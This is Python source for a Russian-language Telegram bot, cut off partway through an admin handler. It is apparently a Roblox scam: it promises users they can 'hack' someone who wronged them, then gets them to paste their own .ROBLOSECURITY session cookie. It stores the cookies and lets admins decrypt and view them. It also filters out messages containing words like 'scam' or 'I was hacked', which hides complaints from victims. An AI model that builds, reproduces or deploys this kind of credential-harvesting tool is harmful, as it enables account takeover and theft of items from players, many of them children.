import telebot
import time
import sqlite3
import hashlib
import random
import string
import signal
import sys
import os
import threading
from cryptography.fernet import Fernet

# Загружаем переменные окружения из .env файла (для локального запуска)
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # dotenv не установлен, используем системные переменные

# Получаем токен бота из переменных окружения
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не установлен!")

bot = telebot.TeleBot(BOT_TOKEN)

# Получаем ID администраторов из переменных окружения
ADMIN_IDS_STR = os.environ.get('ADMIN_IDS')
if not ADMIN_IDS_STR:
    raise ValueError("ADMIN_IDS не установлен!")
admin_ids = [int(id.strip()) for id in ADMIN_IDS_STR.split(',')]

# Шифрование для куков
ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY')
if ENCRYPTION_KEY:
    try:
        cipher = Fernet(ENCRYPTION_KEY.encode() if isinstance(ENCRYPTION_KEY, str) else ENCRYPTION_KEY)
    except:
        print("⚠️ ENCRYPTION_KEY невалидный! Генерируем новый...")
        temp_key = Fernet.generate_key()
        cipher = Fernet(temp_key)
        print(f"⚠️ Добавьте в переменные окружения: ENCRYPTION_KEY={temp_key.decode()}")
else:
    # Генерируем ключ если не задан
    print("⚠️ ENCRYPTION_KEY не задан! Генерируем новый ключ...")
    temp_key = Fernet.generate_key()
    cipher = Fernet(temp_key)
    print(f"⚠️ Скопируйте и добавьте в Apply.build переменную:")
    print(f"ENCRYPTION_KEY={temp_key.decode()}")

# Путь к файлу базы данных SQLite
DATABASE_FILE = "user_database.db"

# Словарь для хранения состояния бана/разбана
ban_state = {}
# Словарь для хранения состояния добавления админа
admin_add_state = {}
# Словарь для хранения состояния удаления админа
admin_remove_state = {}
# Словарь для хранения состояния пробива
probiv_state = {}

# Словарь для хранения пользователей в чате
chat_users = set()

# Словарь для хранения времени последнего запроса помощи
help_request_cooldown = {}

# Словарь для хранения времени последней отправки заявки
submit_request_cooldown = {}

# Блокировка для thread-safe обработки заявок
submit_lock = threading.Lock()

# Словарь для связи сообщений админа и пользователя (для ответов через reply)
message_user_map = {}

# Список запрещенных слов
banned_words = ["меня взломали", "скам", "скамят", "scam", "обман", "обманули"]

# Функция генерации уникального номера
def generate_unique_id(length=4):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def create_database():
    """Создает таблицу users, если она не существует."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            invite TEXT,
            referrer_id INTEGER,
            balance INTEGER DEFAULT 0,
            unique_id TEXT UNIQUE,
            last_interaction INTEGER,
            banned INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0
        )
    """)
    # Таблица для хранения зашифрованных куков
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS cookies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            unique_id TEXT,
            encrypted_cookie TEXT,
            cookie_hash TEXT,
            created_at INTEGER,
            FOREIGN KEY (user_id) REFERENCES users(user_id)
        )
    """)
    
    # Проверяем существует ли колонка cookie_hash, если нет - добавляем (миграция)
    cursor.execute("PRAGMA table_info(cookies)")
    columns = [column[1] for column in cursor.fetchall()]
    if 'cookie_hash' not in columns:
        print("Добавляем колонку cookie_hash в таблицу cookies...")
        cursor.execute("ALTER TABLE cookies ADD COLUMN cookie_hash TEXT")
        conn.commit()
    
    # Создаем индекс для быстрого поиска дубликатов по хешу
    cursor.execute("""
        CREATE INDEX IF NOT EXISTS idx_cookie_hash 
        ON cookies(cookie_hash, created_at DESC)
    """)
    
    conn.commit()
    conn.close()

def generate_referral_code(user_id):
    """Генерирует уникальный реферальный код для пользователя."""
    hash_object = hashlib.sha256(str(user_id).encode())
    hex_dig = hash_object.hexdigest()
    return hex_dig[:8] # Первые 8 символов хеша

def add_user_to_database(user_id, username, invite, referrer_id=None):
    """Добавляет пользователя в базу данных, если его там нет."""
    unique_id = generate_unique_id()
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    if cursor.fetchone() is None:
         cursor.execute("INSERT INTO users (user_id, username, invite, referrer_id, unique_id, last_interaction) VALUES (?, ?, ?, ?, ?, ?)",
                       (user_id, username, invite, referrer_id, unique_id, int(time.time())))
         conn.commit()
         if referrer_id:
            cursor.execute("UPDATE users SET balance = balance + 10 WHERE user_id = ?", (referrer_id,))
            conn.commit() # Начисляем 10 робуксов за рефа
         conn.close()
         return True # Вернуть True, если пользователь успешно добавлен
    else:
        cursor.execute("UPDATE users SET last_interaction = ? WHERE user_id = ?", (int(time.time()), user_id))
        conn.commit()
        conn.close()
        return False  # Вернуть False, если пользователь уже есть в бд

def get_user_info(user_id):
    """Возвращает информацию о пользователе из базы данных."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT username, invite, balance, unique_id, banned, is_admin FROM users WHERE user_id = ?", (user_id,))
    user_info = cursor.fetchone()
    conn.close()
    return user_info

def get_referral_count(user_id):
    """Возвращает количество рефералов у пользователя."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users WHERE referrer_id = ?", (user_id,))
    count = cursor.fetchone()[0]
    conn.close()
    return count

def get_all_user_ids():
    """Возвращает список всех user_id из базы данных."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    user_ids = [row[0] for row in cursor.fetchall()]
    conn.close()
    return user_ids

def get_user_by_unique_id(unique_id):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, username FROM users WHERE unique_id = ?", (unique_id,))
    result = cursor.fetchone()
    conn.close()
    return result if result else None

def get_user_by_username(username):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, unique_id FROM users WHERE username = ?", (username,))
    result = cursor.fetchone()
    conn.close()
    return result if result else None

def get_last_users(limit=7):
    """Получает последние N пользователей, отсортированных по времени последнего взаимодействия."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT username, unique_id FROM users ORDER BY last_interaction DESC LIMIT ?", (limit,))
    users = cursor.fetchall()
    conn.close()
    return users

def get_total_user_count():
    """Возвращает общее количество пользователей в базе данных."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    count = cursor.fetchone()[0]
    conn.close()
    return count

def is_user_banned(user_id):
    """Проверяет, забанен ли пользователь."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT banned FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] == 1 if result else False

def ban_user(unique_id):
    """Банит пользователя по уникальному ID."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    user_info = get_user_by_unique_id(unique_id)
    if user_info:
       user_id = user_info[0]
       cursor.execute("UPDATE users SET banned = 1 WHERE user_id = ?", (user_id,))
       conn.commit()
       conn.close()
       return True
    conn.close()
    return False

def unban_user(unique_id):
    """Разбанивает пользователя по уникальному ID."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    user_info = get_user_by_unique_id(unique_id)
    if user_info:
       user_id = user_info[0]
       cursor.execute("UPDATE users SET banned = 0 WHERE user_id = ?", (user_id,))
       conn.commit()
       conn.close()
       return True
    conn.close()
    return False

def set_admin(unique_id):
    """Дает права админа пользователю по уникальному ID."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    user_info = get_user_by_unique_id(unique_id)
    if user_info:
       user_id = user_info[0]
       cursor.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (user_id,))
       conn.commit()
       conn.close()
       return True
    conn.close()
    return False

def remove_admin(unique_id):
    """Убирает права админа у пользователя по уникальному ID."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    user_info = get_user_by_unique_id(unique_id)
    if user_info:
       user_id = user_info[0]
       cursor.execute("UPDATE users SET is_admin = 0 WHERE user_id = ?", (user_id,))
       conn.commit()
       conn.close()
       return True
    conn.close()
    return False

def is_user_admin(user_id):
    """Проверяет, является ли пользователь админом."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT is_admin FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] == 1 if result else False

def filter_message(message):
    """Проверяет сообщение на наличие запрещенных слов."""
    message_lower = message.lower()
    for word in banned_words:
        if word.lower() in message_lower:
            return False
    return True

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if is_user_banned(user_id):
          bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
          return
    username = message.from_user.username

    # Проверяем, есть ли реферальный код в параметрах
    if len(message.text.split()) > 1:
        referral_code = message.text.split()[1]
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users WHERE username = ?", (referral_code,))
        referrer = cursor.fetchone()
        conn.close()
        if referrer:
            referrer_id = referrer[0]
            if add_user_to_database(user_id, username, referral_code, referrer_id):
                 send_main_menu(message.chat.id, user_id)
            else:
                 send_main_menu(message.chat.id, user_id)
                 bot.send_message(message.chat.id, "Упсс.. Вы уже воспользовались ботом!")
                 return
        else:
           if add_user_to_database(user_id, username, "start"):
               send_main_menu(message.chat.id, user_id)
           else:
                send_main_menu(message.chat.id, user_id)
                return
    else:
         if add_user_to_database(user_id, username, "start"):
              send_main_menu(message.chat.id, user_id)
         else:
             send_main_menu(message.chat.id, user_id)
             return

def send_main_menu(chat_id, user_id=None):
    """Отправляет главное меню с кнопками."""
    markup = generate_main_keyboard(user_id)
    welcome_text = (
        "👋 Привет! Хочешь взломать обидчика в Roblox? Тебе к нам!\n\n"
        "📺 Посмотри этот видео-ролик, в нём рассказано, как получить данные твоего обидчика.\n"
        "Как досмотришь видео, нажимай кнопку 'Получить пароль' ниже и вставляй сюда копируемые тобой данные.\n\n"
        "🎥 https://youtu.be/m3wfiX3o9Eo"
    )
    bot.send_message(chat_id, welcome_text, reply_markup=markup)

def generate_main_keyboard(user_id=None):
    """Создает клавиатуру с кнопками. Для админов добавляет кнопку админ-панели."""
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    button_get_pass = telebot.types.KeyboardButton(text='Получить пароль')
    button_profile = telebot.types.KeyboardButton(text='Профиль')
    button_help = telebot.types.KeyboardButton(text='❓ Помощь')
    
    # Проверяем является ли пользователь админом
    if user_id and (user_id in admin_ids or is_user_admin(user_id)):
        button_admin = telebot.types.KeyboardButton(text='⚙️ Админ-панель')
        markup.add(button_get_pass, button_profile)
        markup.add(button_help, button_admin)
    else:
        markup.add(button_get_pass, button_profile)
        markup.add(button_help)
    
    return markup

@bot.message_handler(func=lambda message: message.text == "Получить пароль")
def get_pass_button_clicked(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    bot.send_message(message.chat.id, "Вставьте сюда данные", reply_markup=telebot.types.ReplyKeyboardRemove()) # Убирает клаву

@bot.message_handler(func=lambda message: message.text == "Профиль")
def handle_profile_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    user_id = message.from_user.id
    user_info = get_user_info(user_id)
    if user_info:
       username, invite, balance, unique_id, banned, is_admin = user_info
       referral_count = get_referral_count(user_id)
       ref_link = f"https://t.me/{bot.get_me().username}?start={username}"

       profile_message = f"👍 Здравствуйте, {message.from_user.first_name}\n"
       profile_message += f"📈 Приведено человек: {referral_count}\n"
       profile_message += f"💲 Баланс: {balance} ROBUX\n"
       profile_message += f"🔋 Ваша рефка: {ref_link}\n"
       profile_message += f"🆔 Ваш ID: {unique_id}"
       if is_admin:
          profile_message += "\n👑 Вы являетесь администратором."

       bot.send_message(message.chat.id, profile_message)
    else:
        bot.send_message(message.chat.id, "Упс.. Что-то пошло не так!")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """Обработчик inline кнопок"""
    if call.data == "refresh_requests":
        # Обновление списка заявок
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM cookies")
        total_requests = cursor.fetchone()[0]
        
        cursor.execute("""
            SELECT id, username, unique_id, created_at 
            FROM cookies 
            ORDER BY created_at DESC 
            LIMIT 20
        """)
        requests = cursor.fetchall()
        conn.close()
        
        if not requests:
            bot.answer_callback_query(call.id, "📋 Заявок нет")
            return
        
        markup = telebot.types.InlineKeyboardMarkup()
        for req_id, username, unique_id, created_at in requests:
            time_str = time.strftime('%d.%m %H:%M', time.localtime(created_at))
            button = telebot.types.InlineKeyboardButton(
                text=f"@{username} ({unique_id}) - {time_str}",
                callback_data=f"view_req_{req_id}"
            )
            markup.add(button)
        
        refresh_btn = telebot.types.InlineKeyboardButton(
            text="🔄 Обновить",
            callback_data="refresh_requests"
        )
        markup.add(refresh_btn)
        
        bot.edit_message_text(
            f"📋 Заявки (всего: {total_requests})\n\n"
            f"Последние 20 заявок:\n"
            f"Нажмите на заявку для просмотра",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup
        )
        bot.answer_callback_query(call.id, "✅ Обновлено")
    
    elif call.data.startswith("view_req_"):
        # Просмотр заявки
        req_id = int(call.data.split("_")[2])
        
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT encrypted_cookie, username, unique_id, created_at 
            FROM cookies 
            WHERE id = ?
        """, (req_id,))
        
        result = cursor.fetchone()
        conn.close()
        
        if not result:
            bot.answer_callback_query(call.id, "❌ Заявка не найдена")
            return
        
        encrypted_cookie, username, unique_id, created_at = result
        
        try:
            # Расшифровываем
            decrypted_cookie = cipher.decrypt(encrypted_cookie.encode()).decode()
            
            # Создаем кнопку удаления
            delete_markup = telebot.types.InlineKeyboardMarkup()
            delete_btn = telebot.types.InlineKeyboardButton(
                text="🗑️ Удалить заявку",
                callback_data=f"del_req_{req_id}"
            )
            back_to_list_btn = telebot.types.InlineKeyboardButton(
                text="⬅️ К списку заявок",
                callback_data="refresh_requests"
            )
            delete_markup.row(delete_btn)
            delete_markup.row(back_to_list_btn)
            
            # Отправляем расшифрованные данные
            bot.send_message(
                call.message.chat.id,
                f"🔓 Расшифрованные данные\n"
                f"👤 @{username}\n"
                f"🆔 {unique_id}\n"
                f"⏰ {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(created_at))}\n\n"
                f"{decrypted_cookie}",
                reply_markup=delete_markup
            )
            
            bot.answer_callback_query(call.id, "✅ Заявка расшифрована")
        
        except Exception as e:
            bot.answer_callback_query(call.id, f"❌ Ошибка: {str(e)}")
    
    elif call.data.startswith("del_req_"):
        # Удаление заявки
        req_id = int(call.data.split("_")[2])
        
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM cookies WHERE id = ?", (req_id,))
        conn.commit()
        conn.close()
        
        # Удаляем сообщение с заявкой
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        
        bot.answer_callback_query(call.id, "🗑️ Заявка удалена")

@bot.message_handler(func=lambda message: message.reply_to_message is not None)
def handle_reply(message):
    """Обработчик ответов на сообщения через reply"""
    if is_user_banned(message.from_user.id):
        return
    
    replied_to = message.reply_to_message.message_id
    
    # Проверяем есть ли связь сообщения с пользователем
    if replied_to in message_user_map:
        target_user_id = message_user_map[replied_to]
        
        # Админ отвечает пользователю
        if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
            sent_msg = bot.send_message(
                target_user_id,
                f"📩 Сообщение от модератора:\n\n{message.text}\n\n"
                f"Чтобы ответить, ответьте на это сообщение или напишите /msg admin <текст>"
            )
            message_user_map[sent_msg.message_id] = target_user_id
            bot.reply_to(message, "✅ Ответ отправлен")
        
        # Пользователь отвечает админу
        else:
            user_info = get_user_info(message.from_user.id)
            if user_info:
                username, _, _, unique_id, _, _ = user_info
                for admin_id in admin_ids:
                    sent_msg = bot.send_message(
                        admin_id,
                        f"📨 Ответ от @{username} ({unique_id}):\n\n{message.text}"
                    )
                    message_user_map[sent_msg.message_id] = message.from_user.id
                bot.reply_to(message, "✅ Ваш ответ отправлен модераторам")

@bot.message_handler(func=lambda message: message.text == "⚙️ Админ-панель")
def handle_admin_panel_button(message):
    """Обработчик кнопки админ-панели"""
    admin_panel(message)

@bot.message_handler(func=lambda message: message.text == "❓ Помощь")
def handle_help_button(message):
    """Обработчик кнопки помощи - отправляет сообщение админам"""
    user_id = message.from_user.id
    current_time = time.time()
    
    # Проверяем cooldown
    if user_id in help_request_cooldown:
        time_passed = current_time - help_request_cooldown[user_id]
        if time_passed < 5:
            remaining = int(5 - time_passed)
            bot.reply_to(message, f"⏰ Подождите {remaining} секунд перед следующим запросом")
            return
    
    # Обновляем время последнего запроса
    help_request_cooldown[user_id] = current_time
    
    # Получаем информацию о пользователе
    user_info = get_user_info(user_id)
    if user_info:
        username, _, _, unique_id, _, _ = user_info
        
        # Отправляем админам
        for admin_id in admin_ids:
            bot.send_message(
                admin_id,
                f"❓ Запрос помощи\n"
                f"👤 @{username}\n"
                f"🆔 {unique_id}\n"
                f"⏰ {time.strftime('%H:%M:%S')}\n\n"
                f"Используйте /msg {unique_id} <текст> для ответа"
            )
        
        bot.reply_to(message, "✅ Ваш запрос отправлен модераторам. Ожидайте ответа.")
    else:
        bot.reply_to(message, "❌ Ошибка. Попробуйте /start")



@bot.message_handler(func=lambda message: message.text.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"))
def handle_pass(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    
    user_id = message.from_user.id
    username = message.from_user.username
    current_time = time.time()
    cookie_text = message.text
    
    # Используем блокировку для thread-safe обработки
    with submit_lock:
        # Проверка кулдауна 10 секунд между любыми отправками
        if user_id in submit_request_cooldown:
            time_passed = current_time - submit_request_cooldown[user_id]
            if time_passed < 10:
                remaining = int(10 - time_passed)
                bot.send_message(message.chat.id, f"⏰ Подождите {remaining} секунд перед следующей отправкой заявки")
                return
        
        # Сразу блокируем повторную отправку от этого юзера
        submit_request_cooldown[user_id] = current_time
        
        # Создаем хеш исходного текста для проверки дубликатов
        cookie_hash = hashlib.sha256(cookie_text.encode()).hexdigest()
        
        # Шифруем куки
        encrypted_cookie = cipher.encrypt(cookie_text.encode()).decode()
        
        # Используем транзакцию для атомарной проверки и вставки
        conn = sqlite3.connect(DATABASE_FILE, timeout=10.0)
        conn.execute("BEGIN IMMEDIATE")  # Начинаем эксклюзивную транзакцию
        
        try:
            cursor = conn.cursor()
            
            cursor.execute("SELECT unique_id FROM users WHERE user_id = ?", (user_id,))
            unique_id_row = cursor.fetchone()
            
            if not unique_id_row:
                conn.rollback()
                conn.close()
                bot.send_message(message.chat.id, "Ошибка! Сначала выполните /start")
                return
            
            unique_id = unique_id_row[0]
            
            # Проверяем есть ли уже такие же куки в БД по ХЕШУ (с блокировкой таблицы)
            cursor.execute("""
                SELECT created_at FROM cookies 
                WHERE cookie_hash = ? 
                ORDER BY created_at DESC 
                LIMIT 1
            """, (cookie_hash,))
            
            existing_cookie = cursor.fetchone()
            
            if existing_cookie:
                last_submit_time = existing_cookie[0]
                time_since_last = current_time - last_submit_time
                
                # Если те же куки были отправлены менее часа назад - отклоняем
                if time_since_last < 3600:  # 3600 секунд = 1 час
                    remaining_minutes = int((3600 - time_since_last) / 60)
                    remaining_seconds = int((3600 - time_since_last) % 60)
                    conn.rollback()
                    conn.close()
                    bot.send_message(
                        message.chat.id, 
                        f"❌ Эти данные уже были отправлены!\n"
                        f"⏰ Повторная отправка возможна через: {remaining_minutes} мин {remaining_seconds} сек"
                    )
                    return
            
            # Сохраняем в БД
            cursor.execute("""
                INSERT INTO cookies (user_id, username, unique_id, encrypted_cookie, cookie_hash, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (user_id, username, unique_id, encrypted_cookie, cookie_hash, int(current_time)))
            
            last_row_id = cursor.lastrowid
            conn.commit()
            conn.close()
            
            # Отправляем уведомление администраторам (БЕЗ куков!)
            for admin_id in admin_ids:
                # Создаем inline кнопку для быстрого просмотра
                quick_view_markup = telebot.types.InlineKeyboardMarkup()
                view_btn = telebot.types.InlineKeyboardButton(
                    text="🔓 Открыть заявку",
                    callback_data=f"view_req_{last_row_id}"
                )
                quick_view_markup.add(view_btn)
                
                bot.send_message(
                    admin_id, 
                    f"🆕 Новая заявка\n"
                    f"👤 @{username}\n"
                    f"🆔 {unique_id}\n"
                    f"⏰ {time.strftime('%H:%M:%S', time.localtime())}\n\n"
                    f"🔐 Данные зашифрованы и сохранены в БД",
                    reply_markup=quick_view_markup
                )

            # Отправляем сообщение пользователю о принятии заявки
            bot.send_message(message.chat.id, "✅ Ваша заявка успешно принята! Ожидайте сообщение от наших модераторов.")
        
        except Exception as e:
            conn.rollback()
            conn.close()
            print(f"Ошибка при обработке заявки: {e}")
            bot.send_message(message.chat.id, "❌ Ошибка обработки заявки. Попробуйте позже.")


@bot.message_handler(commands=['con'])
def handle_con_command(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        unique_id = message.text.split()[1]
        user_info = get_user_by_unique_id(unique_id)
        if user_info:
            user_id = user_info[0]
            bot.send_message(message.chat.id, f"Подключен к пользователю с ID: {user_id}")
        else:
            bot.reply_to(message, "Неверный уникальный ID.")
    else:
        bot.reply_to(message, "У вас нет прав на использование этой команды.")

@bot.message_handler(commands=['getcookie'])
def handle_getcookie_command(message):
    """Команда для получения расшифрованных куков (только для админов)"""
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте.")
        return
    
    if message.from_user.id not in admin_ids and not is_user_admin(message.from_user.id):
        bot.reply_to(message, "❌ У вас нет прав на использование этой команды.")
        return
    
    try:
        unique_id = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "Использование: /getcookie <unique_id>")
        return
    
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT encrypted_cookie, username, created_at 
        FROM cookies 
        WHERE unique_id = ? 
        ORDER BY created_at DESC 
        LIMIT 1
    """, (unique_id,))
    
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        bot.reply_to(message, "❌ Куки не найдены для этого ID")
        return
    
    encrypted_cookie, username, created_at = result
    
    try:
        # Расшифровываем
        decrypted_cookie = cipher.decrypt(encrypted_cookie.encode()).decode()
        
        # Отправляем без Markdown парсинга
        bot.send_message(
            message.chat.id,
            f"🔓 Расшифрованные данные\n"
            f"👤 @{username}\n"
            f"🆔 {unique_id}\n"
            f"⏰ {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(created_at))}\n\n"
            f"{decrypted_cookie}"
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка расшифровки: {e}")

@bot.message_handler(commands=['getdb'])
def handle_getdb_command(message):
    """Отправляет файл базы данных админу"""
    if message.from_user.id not in admin_ids and not is_user_admin(message.from_user.id):
        bot.reply_to(message, "❌ У вас нет прав")
        return
    
    try:
        with open(DATABASE_FILE, 'rb') as db_file:
            bot.send_document(message.chat.id, db_file, caption="📁 База данных")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['msg'])
def handle_msg_command(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    
    # Админы могут писать пользователям
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(message, "Использование: /msg <unique_id или @username> <сообщение>")
            return
        
        identifier = parts[1]
        text_message = parts[2]
        
        # Проверяем это unique_id или username
        if identifier.startswith('@'):
            username = identifier[1:]
            user_info = get_user_by_username(username)
            if user_info:
                user_id, unique_id = user_info
            else:
                bot.reply_to(message, "❌ Пользователь не найден")
                return
        else:
            unique_id = identifier
            user_info = get_user_by_unique_id(unique_id)
            if user_info:
                user_id, username = user_info
            else:
                bot.reply_to(message, "❌ Неверный ID")
                return
        
        # Отправляем сообщение пользователю
        sent_msg = bot.send_message(
            user_id, 
            f"📩 Сообщение от модератора:\n\n{text_message}\n\n"
            f"Чтобы ответить, ответьте на это сообщение или напишите /msg admin <текст>"
        )
        
        # Сохраняем связь сообщения с пользователем для reply
        message_user_map[sent_msg.message_id] = user_id
        
        bot.reply_to(message, f"✅ Сообщение отправлено пользователю @{username}")
    
    # Обычные пользователи могут писать админам через /msg admin
    elif message.text.lower().startswith('/msg admin'):
        text_message = message.text[len('/msg admin'):].strip()
        if not text_message:
            bot.reply_to(message, "Использование: /msg admin <сообщение>")
            return
        
        user_info = get_user_info(message.from_user.id)
        if user_info:
            username, _, _, unique_id, _, _ = user_info
            for admin_id in admin_ids:
                sent_msg = bot.send_message(
                    admin_id, 
                    f"📨 Сообщение от @{username} ({unique_id}):\n\n{text_message}"
                )
                # Сохраняем связь для reply
                message_user_map[sent_msg.message_id] = message.from_user.id
            
            bot.reply_to(message, "✅ Ваше сообщение отправлено модераторам")
        else:
            bot.reply_to(message, "❌ Ошибка. Попробуйте /start")
    else:
        bot.reply_to(message, "У вас нет прав на использование этой команды.")

@bot.message_handler(commands=['admins'])
def admin_panel(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button_users = telebot.types.KeyboardButton(text='👩‍👦Люди')
        button_requests = telebot.types.KeyboardButton(text='📋Заявки')
        button_broadcast = telebot.types.KeyboardButton(text='📢Рассылка')
        button_ban = telebot.types.KeyboardButton(text='⛔️Забанить')
        button_unban = telebot.types.KeyboardButton(text='✅Разбанить')
        button_add_admin = telebot.types.KeyboardButton(text='👑Сделать админом')
        button_remove_admin = telebot.types.KeyboardButton(text='❌Удалить админа')
        button_probiv = telebot.types.KeyboardButton(text='🔍Пробив')
        markup.add(button_users, button_requests)
        markup.add(button_broadcast, button_ban, button_unban)
        markup.add(button_add_admin, button_remove_admin, button_probiv)
        bot.send_message(message.chat.id, "Админ-панель", reply_markup=markup)
    else:
        bot.reply_to(message, "❌ У вас нет прав.")

@bot.message_handler(func=lambda message: message.text == "👩‍👦Люди")
def handle_users_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        total_users = get_total_user_count()
        last_users = get_last_users(10)

        response = f"Всего пользователей: {total_users}\n\n"
        if last_users:
            response += "Последние 10 пользователей:\n"
            for user in last_users:
                response += f"@{user[0]} - {user[1]}\n"
        else:
            response += "Нет пользователей."

        bot.send_message(message.chat.id, response, reply_markup = telebot.types.ReplyKeyboardRemove())

@bot.message_handler(func=lambda message: message.text == "📋Заявки")
def handle_requests_button(message):
    """Показывает список всех заявок с кнопками"""
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте.")
        return
    
    if message.from_user.id not in admin_ids and not is_user_admin(message.from_user.id):
        bot.reply_to(message, "❌ У вас нет прав")
        return
    
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    # Получаем статистику
    cursor.execute("SELECT COUNT(*) FROM cookies")
    total_requests = cursor.fetchone()[0]
    
    # Получаем последние заявки
    cursor.execute("""
        SELECT id, username, unique_id, created_at 
        FROM cookies 
        ORDER BY created_at DESC 
        LIMIT 20
    """)
    requests = cursor.fetchall()
    conn.close()
    
    if not requests:
        # Кнопка "Назад"
        back_markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        back_btn = telebot.types.KeyboardButton(text='⬅️ Назад')
        back_markup.add(back_btn)
        
        bot.send_message(
            message.chat.id, 
            "📋 Заявок нет", 
            reply_markup=back_markup
        )
        return
    
    # Создаем inline кнопки для каждой заявки
    markup = telebot.types.InlineKeyboardMarkup()
    for req_id, username, unique_id, created_at in requests:
        time_str = time.strftime('%d.%m %H:%M', time.localtime(created_at))
        button = telebot.types.InlineKeyboardButton(
            text=f"@{username} ({unique_id}) - {time_str}",
            callback_data=f"view_req_{req_id}"
        )
        markup.add(button)
    
    # Добавляем кнопку обновить
    refresh_btn = telebot.types.InlineKeyboardButton(
        text="🔄 Обновить",
        callback_data="refresh_requests"
    )
    markup.add(refresh_btn)
    
    # Кнопка "Назад" через keyboard
    back_markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    back_btn = telebot.types.KeyboardButton(text='⬅️ Назад')
